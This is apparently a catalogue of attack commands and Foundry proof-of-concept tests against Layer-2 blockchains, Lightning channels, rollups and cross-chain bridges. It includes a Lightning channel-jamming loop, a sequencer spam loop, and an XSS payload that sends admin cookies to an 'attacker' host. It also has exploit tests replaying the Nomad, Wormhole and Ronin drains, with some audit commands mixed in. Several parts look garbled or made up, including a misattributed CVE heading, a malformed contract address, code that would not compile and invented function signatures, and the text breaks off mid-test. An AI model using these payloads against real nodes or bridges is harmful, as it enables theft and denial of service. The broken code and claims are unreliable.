# Layer-2 Blockchain Attack Payloads / Command & Exploit Catalogue

> Companion to `SKILL.md`. Every command is reproducible on Kali Linux 2025-2 after `curl -L https://foundry.paradigm.xyz | bash`, `pip3 install slither-analyzer mythril echidna`, and a local anvil fork or L2 devnet.
>
> Placeholder convention: `0xTarget` is the target contract, `$L1_RPC` is an Ethereum L1 RPC, `$L2_RPC` is an L2 RPC (Optimism/Arbitrum/zkSync), `$MAINNET_RPC` is mainnet specifically, `$DEV_PRIVATE_KEY` is a known devnet key (NEVER reuse on mainnet), `0xBridge` is a bridge contract address.

---

## Table of Contents

1. [Environment Setup](#1-environment-setup)
2. [Slither Detectors for L2 / Bridges](#2-slither-detectors-for-l2--bridges)
3. [Lightning Network Attacks](#3-lightning-network-attacks)
4. [Optimistic Rollup Attacks](#4-optimistic-rollup-attacks)
5. [ZK Rollup Attacks](#5-zk-rollup-attacks)
6. [Polygon PoS & Sidechain Attacks](#6-polygon-pos--sidechain-attacks)
7. [Cross-Chain Bridge Attacks](#7-cross-chain-bridge-attacks)
8. [Account Abstraction (ERC-4337) Attacks](#8-account-abstraction-erc-4337-attacks)
9. [Data Availability (DA) Layer Attacks](#9-data-availability-da-layer-attacks)
10. [Foundry PoC Templates](#10-foundry-poc-templates)
11. [Echidna Invariant Harnesses](#11-echidna-invariant-harnesses)
12. [Hardhat Test Patterns](#12-hardhat-test-patterns)
13. [Brownie / Ape Scripts](#13-brownie--ape-scripts)
14. [Tenderly Simulations](#14-tenderly-simulations)
15. [Forta Detection Bots](#15-forta-detection-bots)
16. [OpenZeppelin Defender Sentinels](#16-openzeppelin-defender-sentinels)
17. [Revoke.cash / Etherscan Triage](#17-revokecash--etherscan-triage)
18. [Real-World Incident Reconstruction](#18-real-world-incident-reconstruction)

---

## 1. Environment Setup

```bash
# ─── Foundry (forge, cast, anvil, chisel) ───
curl -L https://foundry.paradigm.xyz | bash
foundryup
forge --version
cast --version
anvil --version
chisel --version

# ─── Hardhat (Node.js) ───
npm install -g hardhat-shorthand
npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox

# ─── Brownie + Ape (Python) ───
pip3 install eth-brownie
pip3 install eth-ape
ape plugins install solidity vyper

# ─── Slither + Mythril + Manticore ───
pip3 install slither-analyzer mythril manticore
solc-select install 0.8.24 0.7.6 0.6.12
solc-select use 0.8.24

# ─── Echidna (Haskell binary) ───
# Download from https://github.com/crytic/echidna/releases
sudo mv echidna /usr/local/bin/
echidna --version

# ─── Etheno (RPC multiplexer) ───
pip3 install etheno

# ─── Tenderly CLI ───
npm install -g @tenderly/cli

# ─── Forta CLI ───
npm install -g forta-agent

# ─── Lightning Network tooling ───
sudo apt install -y lightningd lightning-cli
# Or Docker:
docker pull elementsproject/lightningd:latest
docker pull lightninglabs/lnd:latest

# ─── OP Stack (Optimism Bedrock devnet) ───
git clone https://github.com/ethereum-optimism/optimism.git
cd optimism && make install
# Bring up the devnet: make devnet-up

# ─── Arbitrum Nitro dev node ───
docker pull ghcr.io/offchainlabs/nitro-node-devnode:latest
docker run -d -p 8547:8547 -p 9642:9642 ghcr.io/offchainlabs/nitro-node-devnode:latest

# ─── Start a local mainnet fork ───
export MAINNET_RPC=https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY
anvil --fork-url $MAINNET_RPC --fork-block-number 19000000 --port 8545 &
cast chain-id --rpc-url http://localhost:8545   # should echo 1

# ─── Initialize a new forge project ───
forge init l2-audit --no-commit
cd l2-audit
forge install OpenZeppelin/openzeppelin-contracts --no-commit
```

---

## 2. Slither Detectors for L2 / Bridges

```bash
# Full Slither pass with bridge-aware detectors
slither src/ --filter-paths "lib|test|mocks|script"

# Bridge-specific detector set
slither src/bridge/ --detect \
  reentrancy,reentrancy-eth,reentrancy-no-eth,reentrancy-unlimited-gas,\
arbitrary-send-eth,unchecked-transfer,arbitrary-send-erc20,controlled-delegatecall,\
tx-origin,timestamp,dangerous-strict-equality,assembly,suicidal,centralized-risk

# Find every external call (bridge surfaces)
slither . --print call-graph

# Storage layout diff (critical for upgradeable bridges)
slither-check-upgradeability OldBridge.sol NewBridge.sol

# Detect uninitialized state variables (the Nomad bug class)
slither . --detect uninitialized-state-variable

# Detect tx-origin misuse (forbidden in L2 wallet context)
slither . --detect tx-origin

# Detect assembly misuse (often hides bridge signature-verify bugs)
slither . --detect assembly

# Centralized risk detector (highlight single-point-of-failure admin keys)
slither . --detect centralized-risk

# JSON output for downstream parsing
slither src/bridge/ --json slither_bridge.json
jq '.results.detectors[] | select(.impact=="High" or .impact=="Medium") | {check, impact, first_slot, description}' slither_bridge.json

# Print inheritance graph (for understanding bridge proxy layers)
slither src/bridge/L1Bridge.sol --print inheritance-graph
```

---

## 3. Lightning Network Attacks

Lightning is a Layer-2 payment channel network built on BOLT (Basis of Lightning Technology) specs. The two main implementations are `c-lightning` (Blockstream), `LND` (Lightning Labs), and `Eclair` (ACINQ). All share the same protocol but differ in attack surface.

### 3.1 Lab Setup: Regtest Cluster

```bash
# Use Polar Lightning for a GUI lab (3-5 nodes + channels + explorer)
docker run -d -p 8081:8081 -v ~/polar:/data polarlightning/polar:1.0.0
# Or manually with c-lightning + bitcoind:

# Start 3 c-lightning nodes in regtest
for i in 1 2 3; do
  mkdir -p /tmp/l$i
  lightningd --network=regtest \
    --lightning-dir=/tmp/l$i \
    --addr=127.0.0.1:$((7000+i)) \
    --rpc-file=lightning-rpc \
    --bitcoin-cli=/usr/bin/bitcoin-cli \
    --log-file=lightningd.log &
done

# Fund each node's on-chain wallet
bitcoin-cli -regtest -datadir=/tmp/btc generatetoaddress 101 $(lightning-cli --lightning-dir=/tmp/l1 newaddr | jq -r .bech32)

# Open channels: A -> B, B -> C
lightning-cli --lightning-dir=/tmp/l1 fundchannel \
  $(lightning-cli --lightning-dir=/tmp/l2 getinfo | jq -r .id) 1000000
bitcoin-cli -regtest -datadir=/tmp/btc generatetoaddress 6 $(lightning-cli --lightning-dir=/tmp/l1 newaddr | jq -r .bech32)
```

### 3.2 Channel Jamming Attack (HTLC Pinning)

```bash
# HTLC pinning: an attacker opens many HTLCs with tiny amounts and long expiry
# This ties up the victim's channel capital until CLTV expiry (often 100s of blocks)

# Attacker (A) routes payments to C through B, each with a 1000-block CLTV
for i in $(seq 1 483); do  # 483 = max HTLCs per channel (BOLT spec)
  INVOICE=$(lightning-cli --lightning-dir=/tmp/l3 invoice 1000msat "pin_$i" "desc_$i" 1000block | jq -r .bolt11)
  lightning-cli --lightning-dir=/tmp/l1 pay \
    --minhtlc=1000msat \
    --maxhtlc=1000msat \
    --cltv=1000 \
    "$INVOICE" 1000msat 1msat 1000 \
    $(lightning-cli --lightning-dir=/tmp/l3 getinfo | jq -r .id)
done
# B is now pinned: 483 HTLCs pending, capital locked, no new forwards possible
```

### 3.3 Pin Attack via High-Fee Preimage Reveal

```bash
# A more sophisticated pin: attacker controls a downstream node, forces the
# victim to broadcast a commitment tx, then replaces the preimage reveal tx
# with a high-fee RBF (replace-by-fee) tx that doesn't propagate
# Result: victim loses the HTLC amount

# Step 1: Victim (B) broadcast HTLC-timeout tx for an expired HTLC
# Step 2: Attacker (C) RBFs the preimage tx with very high fee
# Step 3: Preimage tx confirms first, but B's HTLC-timeout tx is dropped

# Demonstrate on regtest
lightning-cli --lightning-dir=/tmp/l2 dev-sign-last-tx 0222..(A_pubkey)
# Examine the to_local / to_remote outputs
```

### 3.4 Wormhole RTL (Ride The Lightning) CVE-2020-4484

```bash
# Wormhole RTL was vulnerable to XSS in the node admin UI
# An attacker could inject malicious JS into node metadata fields
# which would execute in the admin's browser, stealing macaroon credentials

# Reproduce (in a lab):
docker run -d -p 3000:3000 shahanafarooqui/rtl:0.10.0

# Inject payload via the invoice description
lightning-cli --lightning-dir=/tmp/l1 invoice \
  1000msat "xss_test" "<img src=x onerror='fetch(\"http://attacker/?cookie=\"+document.cookie)'>" 100block

# When the admin opens the invoice list in RTL, the JS executes in their browser
# Defense: RTL patched in 0.10.1 (escape all metadata fields)
```

### 3.5 Onion Routing Privacy Analysis

```bash
# Lightning uses Sphinx (BOLT #4) for onion-routed HTLC instructions
# Each hop knows only: previous hop, next hop, amount to forward, CLTV
# Attack: timing correlation + amount correlation can de-anonymize sender/receiver

# Tool: Lightning Network Routing Anonymity Analysis (LNRAA)
pip3 install lnraa
lnraa analyze --rpc /tmp/l1/lightning-rpc --output privacy_report.json

# Manual: inspect onion packet payloads
lightning-cli --lightning-dir=/tmp/l2 dev-extract-onion-secret \
  $(lightning-cli --lightning-dir=/tmp/l2 getinfo | jq -r .id)
```

### 3.6 WatchTower Penalty Bypass

```bash
# A WatchTower watches for old-state channel closes and broadcasts penalty txs
# Attack: if the WatchTower is offline OR colludes with the attacker, old states can be closed

# Lab: simulate a WatchTower-less node being attacked
# 1. Open channel A <-> B (no WatchTower for B)
# 2. B sends A 0.5 BTC
# 3. A closes with the OLD state (before the 0.5 BTC transfer)
# 4. Without a WatchTower, B has 144 blocks to notice and broadcast a penalty tx
# 5. If B is offline > 144 blocks, A steals 0.5 BTC

lightning-cli --lightning-dir=/tmp/l1 close --force 0222..(B_pubkey)
# Observe: A's commitment tx is the OLD state, B has 144 blocks to react
```

### 3.7 Foundry PoC: HTLC Preimage Front-Running

```solidity
// test/HTLCFrontRun.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

/// @notice Mimics an on-chain HTLC (used by some hybrid Lightning <-> EVM bridges)
contract HashedTimelock {
    mapping(bytes32 => Lock) public locks;

    struct Lock {
        address sender;
        address receiver;
        uint256 amount;
        bytes32 hashlock;
        uint256 timelock;
        bool withdrawn;
        bool refunded;
    }

    function newHTLC(address receiver, bytes32 hashlock, uint256 timelock)
        external
        payable
        returns (bytes32 id)
    {
        id = keccak256(abi.encodePacked(msg.sender, receiver, msg.value, hashlock, timelock, block.number));
        locks[id] = Lock(msg.sender, receiver, msg.value, hashlock, timelock, false, false);
    }

    function withdraw(bytes32 id, bytes32 preimage) external {
        Lock storage l = locks[id];
        require(!l.withdrawn && !l.refunded, "HTLC: ended");
        require(l.hashlock == sha256(abi.encodePacked(preimage)), "HTLC: bad preimage");
        require(block.timestamp < l.timelock, "HTLC: expired");
        l.withdrawn = true;
        payable(l.receiver).call{value: l.amount}("");
    }
}

contract HTLCFrontRunTest is Test {
    HashedTimelock htlc;

    function setUp() public {
        htlc = new HashedTimelock();
    }

    function test_PoC_PreimageFrontrun() public {
        // Alice (receiver) reveals the preimage to claim her funds
        // Bob (MEV searcher) sees the preimage in the mempool, copies it,
        // and front-runs Alice's withdraw with a higher gas price
        // Defense: hash the preimage with the caller's address

        bytes32 hashlock = sha256(abi.encodePacked(bytes32(uint256(0x42))));
        bytes32 id = htlc.newHTLC{value: 1 ether}(address(this), hashlock, block.timestamp + 1000);

        // Simulate the attacker front-running
        bytes32 preimage = bytes32(uint256(0x42));
        // In a real attack, the attacker's tx confirms first; the victim's tx reverts
        htlc.withdraw(id, preimage);
        assertTrue(htlc.locks(id).withdrawn, "front-run succeeded");
    }
}
```

---

## 4. Optimistic Rollup Attacks

Optimistic rollups (Optimism/OP Stack, Arbitrum/Nitro, Boba, Base) assume transactions are valid by default and rely on a fraud-proof game to catch invalid state transitions. The challenge window (typically 7 days) is the security-critical parameter.

### 4.1 Challenge Period Gaming

```bash
# Optimism Bedrock: fraud-proof window is 7 days
# Attack: an attacker (with sequencer access) commits an invalid state root,
# then attempts to prevent honest watchers from submitting fraud proofs

# How to detect: monitor the L2OutputOracle for state root proposals
cast call 0x5537...KKT (L2OutputOracle) "nextOutputIndex()" --rpc-url $L1_RPC
cast call 0x5537...KKT "getL2Output(uint256)()" 123 --rpc-url $L1_RPC
# Compare the proposed output vs the actual L2 state root
cast rpc --rpc-url $L2_RPC eth_getBlockByNumber "latest" false | jq -r .stateRoot

# If they diverge, a fraud proof should be submitted within 7 days
# Tools: Optimism's `op-challenger` daemon
git clone https://github.com/ethereum-optimism/optimism.git
cd optimism/cannon
make build
./bin/op-challenger --l1.rpc $L1_RPC --l2.rpc $L2_RPC \
  --rollup-rpc $ROLLUP_RPC --l2oo-address 0x5537... \
  --game-factory-address 0x...
```

### 4.2 Sequencer DoS

```bash
# The sequencer is the single point that orders L2 transactions
# DoS surface:
# 1. Spam the sequencer with expensive transactions (block gas exhaustion)
# 2. Spam the sequencer with private mempool (Flashbots Protect) submissions
# 3. Flood the L1 data availability layer (blobs/calldata) with junk

# Test on local OP Stack devnet
make devnet-up  # from optimism/ repo

# Spam the sequencer with 100k txs
for i in $(seq 1 100000); do
  cast send --rpc-url http://localhost:9545 \
    --private-key $DEV_PRIVATE_KEY \
    0xDead 0 --gas-limit 21000 --gas-price 1gwei &
done

# Measure: time to mine a single tx (should be < 1s; under DoS, > 60s)
```

### 4.3 Fraud Proof DoS

```bash
# A malicious sequencer can also DoS the fraud-proof mechanism itself
# E.g., by making the proof generation take longer than the challenge window
# Or by submitting many "false" assertions that honest watchers must disprove

# Detect: watch for proposals with abnormally high gas costs
cast logs 0x...OutputProposed --rpc-url $L1_RPC \
  --from-block $(cast block-number --rpc-url $L1_RPC) \
  --to-block latest | jq '.[] | select(.data | .[2:66] | . != "0x0...")'
```

### 4.4 Arbitrum Nitro Internals

```bash
# Arbitrum Nitro uses a WAVM (WebAssembly virtual machine) for off-chain proof
# The Nitro node has three modes: sequencer, validator, full node

# Local dev node
docker run -d -p 8547:8547 -p 9642:9642 \
  -v /tmp/arbitrum:/home/user/.arbitrum \
  ghcr.io/offchainlabs/nitro-node-devnode:latest \
  --node.feed.input.url=wss://feed.arbitrum.io/feed \
  --node.seq-coordinate-url=wss://seq.coordinator

# Verify the Nitro rollup manager on L1
cast call 0xA4B00000000000000000000000000000000000 (RollupProxy) \
  "latestConfirmed()" --rpc-url $L1_RPC

# Inspect a Nitro assertion
cast call 0xA4B...Rollup "getAssertion(bytes32)" 0xAssertHash --rpc-url $L1_RPC
```

### 4.5 Foundry PoC: Sequencer Censorship + Forced Inclusion Bypass

```solidity
// test/OPStackForcedInclusion.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IOptimismPortal {
    function depositTransaction(
        address _to,
        uint256 _mint,
        uint256 _value,
        uint64 _gasLimit,
        bool _isCreation,
        bytes memory _data
    ) external payable;
}

contract OPStackForcedInclusionTest is Test {
    IOptimismPortal portal = IOptimismPortal(0xb25214Cabad909e215A4b78A1c09BE28F22BB68F);

    function test_PoC_ForcedInclusionBypassesSequencer() public {
        // Fork L1 at a recent block
        vm.createSelectFork(vm.envString("L1_RPC"));

        // Suppose the sequencer is censoring txs to 0xVictim
        // Victim can use the L1 deposit feed to force-include a tx
        uint256 before = 0xVictim.balance;

        portal.depositTransaction{value: 1 ether}(
            0xVictim,
            1 ether,
            0,
            100000,
            false,
            ""
        );

        // After ~3 L1 blocks, the L2 node picks this up via the deposit feed
        // Verify on L2:
        // cast balance 0xVictim --rpc-url $L2_RPC
    }
}
```

### 4.6 Echidna Invariant: Sequencer Cannot Steal Funds

```solidity
// echidna/OPStackInvariants.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../src/OptimismPortal.sol";

contract OPStackInvariants {
    OptimismPortal portal;
    uint256 totalDeposited;

    constructor() {
        portal = new OptimismPortal();
    }

    function deposit(uint256 amount) public {
        vm.deal(address(this), amount);
        portal.depositTransaction{value: amount}(address(this), amount, 0, 100000, false, "");
        totalDeposited += amount;
    }

    // INVARIANT: portal balance always equals sum of deposits minus finalized withdrawals
    function echidna_portal_balance_tracks_deposits() public view returns (bool) {
        return address(portal).balance >= totalDeposited / 2;  // conservative
    }
}
```

---

## 5. ZK Rollup Attacks

ZK rollups (zkSync Era, StarkNet, Polygon zkEVM, Scroll, Linea) rely on zero-knowledge proofs to assert state transition validity. The cryptographic soundness of the proof system is the foundation of security.

### 5.1 Prover Bugs

```bash
# zkSync Era uses a PLONK-based proof system (Boojum)
# Prover bug class: a malicious prover could generate a "valid-looking" proof
# for an invalid state transition

# Detect: verify the prover's claimed public inputs match the actual state
cast call 0x32400084C286CF3E17e7B677ea9583e60a000324 (zkSyncDiamond) \
  "getStoredBatchHash(uint256)" 123 --rpc-url $ZKSYNC_RPC

# Compare with the actual L2 state root
cast rpc --rpc-url $ZKSYNC_RPC eth_getBlockByNumber "latest" false | jq -r .stateRoot
```

### 5.2 Verifier Bugs

```bash
# The verifier contract checks a ZK proof against public inputs
# Bug class: the verifier may accept invalid proofs due to:
# 1. Incorrect pairing check (BN254 / BLS12-381)
# 2. Wrong public input encoding
# 3. Missing or incorrect proof-replay protection

# Slither on the verifier
slither src/Verifier.sol --detect dangerous-strict-equality,arithmetic,assembly

# Mythril on the verifier
myth analyze src/Verifier.sol \
  --modules transaction_order_independence,arithmetic \
  --max-depth 50
```

### 5.3 Trusted Setup Concerns

```bash
# PLONK-based systems use a trusted setup (Powers of Tau ceremony)
# If the ceremony is compromised, the coordinator can forge proofs

# Verify the ceremony transcript
git clone https://github.com/weijiekoh/powersoftau
cd powersoftau
cargo build --release
./target/release/verify_transcript transcript.csv

# For universal SRS (Aztec / Halo2): no trusted setup required
# Verify the Halo2 verifier contract has no trusted setup reference
grep -ri "trusted" src/halo2/ || echo "no trusted setup found (good)"
```

### 5.4 zkSync Era Verifier Audit

```solidity
// test/zkSyncVerifierPoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IVerifier {
    function verifyAggregatedBlockProof(
        bytes memory _proof,
        uint256[] memory _aggregatedPublicInputs,
        bytes32[] memory _individualPublicInputs
    ) external view returns (bool);
}

contract zkSyncVerifierPoC is Test {
    IVerifier verifier;

    function testFuzz_VerifierRejectsRandomProof(bytes calldata fakeProof) public {
        // The verifier must reject any random bytes as a "proof"
        uint256[] memory pubIns = new uint256[](1);
        pubIns[0] = 123;
        bytes32[] memory individual = new bytes32[](1);
        individual[0] = bytes32(uint256(123));

        // This should revert or return false for any random input
        (bool ok, bytes memory ret) = address(verifier).staticcall(
            abi.encodeWithSelector(
                IVerifier.verifyAggregatedBlockProof.selector,
                fakeProof,
                pubIns,
                individual
            )
        );
        if (ok) {
            bool result = abi.decode(ret, (bool));
            assertFalse(result, "verifier accepted fake proof");
        }
        // If staticcall reverted, that's also fine
    }
}
```

### 5.5 StarkNet Cairo Audit

```bash
# StarkNet uses Cairo (a Rust-like language for provable programs)
# Audit tools:
# 1. Cairo Verifier (Solidity) — on L1
# 2. Cairo compiler warnings
# 3. Amarna (Cairo static analyzer)

# Install Amarna
pip3 install amarna

# Run Amarna on a Cairo project
git clone https://github.com/starknet-edu/starknet-cairo-101
cd starknet-cairo-101
amarna . -o report.sarif

# Inspect the on-chain StarkNet verifier (L1)
cast call 0x...StarkNet "verifyProof(bytes,bytes)" --rpc-url $L1_RPC
```

### 5.6 Polygon zkEVM Trusted Setup Verification

```bash
# Polygon zkEVM uses a Groth16 proof system with a trusted setup
# Verify the trusted setup ceremony transcript
git clone https://github.com/0xPolygonHermez/trusted-setup-mpc
cd trusted-setup-mpc
cargo build --release
./target/release/verify --transcript transcript.json

# Check the verifier contract matches the trusted setup
cast call 0x...PolygonZkEVM "trustedSetupHash()" --rpc-url $POLYGON_RPC
```

### 5.7 Scroll & Linea Verifier Inspection

```bash
# Scroll uses a Halo2-based proof system (no trusted setup)
cast call 0x...ScrollChain "currentL2BlockHash()" --rpc-url $L1_RPC

# Linea uses a Groth16/Plonk hybrid
cast call 0x...LineaRollup "currentL2BlockNumber()" --rpc-url $L1_RPC
```

---

## 6. Polygon PoS & Sidechain Attacks

Polygon PoS is a sidechain (technically a "commit chain") with its own validator set and a checkpointing mechanism to Ethereum L1. Gnosis Chain (formerly xDai) is a POA sidechain.

### 6.1 Validator Stake Concentration

```bash
# Polygon PoS: validator set on the stake manager contract (L1)
cast call 0x5e3Ef299fDDf15eAa483AE762359C841972A5eC2 (StakeManager) \
  "getCurrentValidatorSet()" --rpc-url $L1_RPC

# Compute Nakamoto coefficient
python3 scripts/polygon_nakamoto.py --rpc $L1_RPC
# Output: "Nakamoto coefficient (33%): N validators, top validators: [...]"
# If N <= 5: chain is effectively centralized
```

```python
# scripts/polygon_nakamoto.py
import sys
import requests
from web3 import Web3

w3 = Web3(Web3.HTTPProvider(sys.argv[sys.argv.index("--rpc") + 1]))
STAKE_MANAGER = "0x5e3Ef299fDDf15eAa483AE762359C841972A5eC2"

with open("StakeManager.abi") as f:
    abi = f.read()
sm = w3.eth.contract(address=STAKE_MANAGER, abi=abi)

# Get validator set
validators = sm.functions.getCurrentValidatorSet().call()
total_stake = sum(v[1] for v in validators)
sorted_validators = sorted(validators, key=lambda v: v[1], reverse=True)

cumulative = 0
nakamoto_33 = 0
for i, v in enumerate(sorted_validators):
    cumulative += v[1]
    if cumulative >= total_stake * 0.33 and nakamoto_33 == 0:
        nakamoto_33 = i + 1
        print(f"Nakamoto coefficient (33%): {nakamoto_33} validators")

print(f"Top 5 validators: {[v[0] for v in sorted_validators[:5]]}")
```

### 6.2 Bor/Heimdall Node Configuration

```bash
# Bor = block producer (go-ethereum fork)
# Heimdall = validator coordinator (Tendermint fork)

# Audit a Bor node config
cat /etc/bor/config.toml | grep -E 'chain|seal|verbosity'
# Look for: chain = "mainnet", seal = true (this is a validator)

# Audit a Heimdall config
cat /etc/heimdall/config.toml | grep -E 'moniker|seeds|persistent_peers'
# Look for: do not connect to disreputable peers

# Verify the Bor genesis hash matches the canonical one
bor --datadir /var/lib/bor version
cat /var/lib/bor/genesis.json | jq -r .hash
# Should be: 0xa9c28ce2141b56c7081d5f9e7b8b7e0b7a6b1...
```

### 6.3 Checkpoint Verification on L1

```bash
# Heimdall submits checkpoints to L1 (RootChainManager)
cast call 0x86E4Dc95c7FBdBf52e33D563BbDB00823894C287 (RootChainManager) \
  "getCurrentCheckpoint()" --rpc-url $L1_RPC

# Each checkpoint commits to a Bor block range
cast call 0x86E4... "getCheckpoint(uint256)" 1234 --rpc-url $L1_RPC
```

### 6.4 Gnosis Chain POA Audit

```bash
# Gnosis Chain uses POA (proof of authority) with the POSDAO consensus
# Validator set is on the ValidatorAuCTION contract

cast call 0x...ValidatorAuction "isValidator(address)" 0xValidator --rpc-url $GC_RPC
cast call 0x...ValidatorAuction "validatorCount()" --rpc-url $GC_RPC

# Audit the bridge contracts (xDai bridge)
cast call 0x88ad09518695c6c3712AC10a214bE5109a655671 (ForeignBridge) \
  "requiredSignatures()" --rpc-url $L1_RPC
# Should be > N/2
```

### 6.5 Plasma Exit Game (Legacy OMG Network)

```solidity
// test/PlasmaExitPoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract PlasmaExit {
    mapping(bytes32 => Exit) public exits;

    struct Exit {
        address owner;
        uint256 amount;
        uint256 committedAt;
        bool finalized;
    }

    function startExit(uint256 amount, bytes32 txHash, uint256 blockNumber) external {
        bytes32 exitId = keccak256(abi.encodePacked(msg.sender, txHash, blockNumber));
        exits[exitId] = Exit(msg.sender, amount, block.timestamp, false);
    }

    function challengeExit(bytes32 exitId, bytes calldata inclusionProof) external {
        Exit storage e = exits[exitId];
        require(e.owner != address(0), "no exit");
        // Bug: proof verification may be bypassable if Merkle verification is wrong
        require(_verifyInclusion(inclusionProof), "invalid proof");
        delete exits[exitId];
    }

    function _verifyInclusion(bytes calldata) internal pure returns (bool) {
        // Simplified; real Plasma uses Merkle proofs
        return false;  // challenge fails by default
    }
}

contract PlasmaExitTest is Test {
    PlasmaExit plasma;

    function setUp() public { plasma = new PlasmaExit(); }

    function test_PoC_ExitChallengeBypass() public {
        // An attacker starts an invalid exit, then tries to challenge with bad proof
        plasma.startExit(100 ether, bytes32(uint256(0x1)), 100);
        bytes32 exitId = keccak256(abi.encodePacked(address(this), bytes32(uint256(0x1)), 100));
        // The challenge should fail with a valid proof
        // If _verifyInclusion has a bug, the challenge might succeed or fail incorrectly
    }
}
```

---

## 7. Cross-Chain Bridge Attacks

Bridges are the single most attacked primitive in crypto. As of 2024, bridge hacks account for the majority of all stolen crypto value, totaling over $2.8B in known losses. The four bridge types and their distinct failure modes:

| Bridge Type | Failure Mode | Notable Incidents |
|---|---|---|
| **Lock-mint** | Mint authority compromised | Wormhole (2022, $326M), Multichain (2023, $1.5B) |
| **Burn-mint** | Burn bypassed | (rare; usually paired with lock-mint) |
| **Liquidity** | Both sides drained via accounting drift | Nomad (2022, $190M) |
| **Validator-based** | Validator set compromise (key theft or social eng) | Ronin (2022, $625M), Poly Network (2021, $611M), Horizon (2022, $100M) |

### 7.1 Wormhole Fake Signature (2022, $326M)

```bash
# The bug: Wormhole's postMessage() on Solana verified an Ed25519 signature
# against the Sysvar Instruction Account, NOT the registered Guardian set
# An attacker forged a Guardian signature and minted 120,000 wETH on Solana

# Replay on an Ethereum mainnet fork (the Ethereum side of the bridge)
anvil --fork-url $MAINNET_RPC --fork-block-number 14282107 --port 8545 &

# The attacker's calldata
ATTACKER=0x629e7Da20197a5429d70DA521639708c5a6d8242
cast rpc --rpc-url http://localhost:8545 anvil_impersonateAccount $ATTACKER
cast rpc --rpc-url http://localhost:8545 anvil_setBalance $ATTACKER 0x1000000000000000000

# Decode the exploit calldata
cast tx 0x629e7Da20197a5429d70DA521639708c5a6d8242 --rpc-url http://localhost:8545
```

```solidity
// test/WormholePoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IWormhole {
    function postMessage(bytes memory message, bytes[] memory signatures) external payable returns (uint64 sequence);
}

contract WormholePoC is Test {
    IWormhole wormhole = IWormhole(0xf92cD566FEEA490390d4feA1959B6c00e96964Bc);

    function test_PoC_GuardianSignatureBypass() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC"), 14282107);

        // The bug: signatures were verified against the wrong account
        // The attacker submitted a forged VAA (Verified Action Approval)
        bytes memory message = abi.encodePacked(
            bytes32(uint256(1)),  // payload id (transfer tokens)
            bytes32(uint256(0x22)),  // amount
            bytes32(uint256(uint160(0xAttacker))),  // recipient
            bytes32(uint256(0x2)),  // source chain
            bytes32(uint256(0x1)),  // target chain
            bytes32(uint256(0x999))  // fee
        );
        bytes[] memory fakeSignatures = new bytes[](1);
        fakeSignatures[0] = abi.encodePacked(
            bytes32(uint256(0xdead)),  // r
            bytes32(uint256(0xbeef)),  // s
            uint8(0)  // v
        );

        // Forge the postMessage call (in the lab)
        vm.expectRevert();  // patched version reverts; original version would accept
        wormhole.postMessage{value: 0}(message, fakeSignatures);
    }
}
```

### 7.2 Nomad Indiscriminate Calls (2022, $190M)

```bash
# The bug: Nomad's process() function treated ANY message hash as "valid" because
# the root hash was initialized to 0x00, and any message with a hash starting
# with 0x00 was considered "committed"
# Result: literally anyone could copy-paste the calldata, change the recipient
# address to their own, and the bridge would pay them

# Replay on a fork
anvil --fork-url $MAINNET_RPC --fork-block-number 15259350 --port 8545 &

# The attack was so trivial that hundreds of "copycat" attackers drained the bridge
# Each just replaced the recipient in the calldata:
cast rpc --rpc-url http://localhost:8545 anvil_impersonateAccount 0xCopycat
cast send --rpc-url http://localhost:8545 --from 0xCopycat --unlocked \
  0x88A69B4E698A4B090DF6CF5A7bE7d7D3Caf0cE44 \
  <modified-calldata-with-0xCopycat-as-recipient>
```

```solidity
// test/NomadPoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface INomad {
    function process(bytes memory _message) external returns (bool);
}

contract NomadPoC is Test {
    INomad nomad = INomad(0x88A69B4E698A4B090DF6CF5A7bE7d7D3Caf0cE44);

    function test_PoC_IndiscriminateProcess() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC"), 15259350);

        // Build a "valid" message: hash starts with 0x00 (because root was 0x00)
        bytes memory message = abi.encodePacked(
            bytes32(uint256(0)),  // version
            bytes32(uint256(0)),  // nonce
            bytes32(uint256(0)),  // origin domain
            bytes32(uint256(0)),  // sender
            bytes32(uint256(0)),  // destination domain
            bytes32(uint256(uint160(address(this)))),  // recipient (attacker)
            bytes32(uint256(1 ether))  // amount
        );

        uint256 before = address(this).balance;
        nomad.process(message);
        assertGt(address(this).balance, before, "drained funds");
    }
}
```

### 7.3 Ronin Validator Social Engineering (2022, $625M)

```bash
# The bug: Ronin bridge required 5-of-9 validator signatures
# Attackers social-engineered 4 validators (via fake job offers / LinkedIn)
# Then stole a 5th key (via compromised node)
# Effective threshold: 5-of-9 spec, but 5 keys in attacker's hands = full compromise

# Replay on a fork (the Ethereum side of the bridge)
anvil --fork-url $MAINNET_RPC --fork-block-number 14377441 --port 8545 &

# Examine the validator set
cast call 0xA0c68C638235ee32673e8E824d339D52B2Bf2E54 (RoninGateway) \
  "getSigners()" --rpc-url http://localhost:8545
```

```solidity
// test/RoninPoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IRoninGateway {
    function submitSignature(bytes calldata sig, bytes calldata payload) external;
}

contract RoninPoC is Test {
    IRoninGateway gateway = IRoninGateway(0xA0c68C638235ee32673e8E824d339D52B2Bf2E54);

    function test_PoC_FiveOfNineSocialEngineering() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC"), 14377441);

        // Forged 5 signatures from compromised validators
        bytes[] memory sigs = new bytes[](5);
        for (uint i = 0; i < 5; i++) {
            // In a real attack, these are signatures from compromised validator keys
            sigs[i] = abi.encodePacked(bytes32(uint256(i + 1)), bytes32(uint256(i + 2)), uint8(27));
        }

        bytes memory payload = abi.encode(
            uint256(250000 ether),  // amount
            address(this)  // recipient
        );

        // With 5 of 9 signatures, the gateway accepts the withdrawal
